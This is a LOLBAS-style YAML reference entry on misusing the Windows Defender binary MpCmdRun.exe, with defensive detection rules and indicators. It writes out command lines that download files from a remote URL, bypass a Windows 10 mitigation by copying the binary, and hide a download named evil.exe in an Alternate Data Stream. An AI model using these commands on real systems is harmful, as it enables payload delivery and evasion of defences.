---
Name: MpCmdRun.exe
Description: Binary part of Windows Defender. Used to manage settings in Windows Defender
Author: Oddvar Moe
Created: 2020-03-20
Commands:
  - Command: MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}
    Description: Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)
    Usecase: Download file
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows 10
  - Command: copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe
    Description: Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path) [updated version to bypass Windows 10 mitigation]
    Usecase: Download file
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows 10
  - Command: MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe
    Description: Download file to machine and store it in Alternate Data Stream
    Usecase: Hide downloaded data into an Alternate Data Stream
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows 10
Full_Path:
  - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe
  - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.7-0\MpCmdRun.exe
  - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe
  - Path: C:\Program Files\Windows Defender\MpCmdRun.exe
  - Path: C:\Program Files (x86)\Windows Defender\MpCmdRun.exe
  - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23110.3-0\X86\MpCmdRun.exe
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/159bf4bbc103cc2be3fef4b7c2e7c8b23b63fd10/rules/windows/process_creation/win_susp_mpcmdrun_download.yml
  - Elastic: https://github.com/elastic/detection-rules/blob/6ef5c53b0c15e344f0f2d1649941391aea6fa253/rules/windows/command_and_control_remote_file_copy_mpcmdrun.toml
  - IOC: MpCmdRun storing data into alternate data streams.
  - IOC: MpCmdRun retrieving a file from a remote machine or the internet that is not expected.
  - IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching mpcmdrun.exe.
  - IOC: Monitor for the creation of %USERPROFILE%\AppData\Local\Temp\MpCmdRun.log
  - IOC: User Agent is "MpCommunication"
Resources:
  - Link: https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-line-arguments-microsoft-defender-antivirus
  - Link: https://twitter.com/mohammadaskar2/status/1301263551638761477
  - Link: https://twitter.com/Oddvarmoe/status/1301444858910052352
  - Link: https://twitter.com/NotMedic/status/1301506813242867720
Acknowledgement:
  - Person: Askar
    Handle: '@mohammadaskar2'
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
  - Person: RichRumble
  - Person: Cedric
    Handle: '@th3c3dr1c'
---
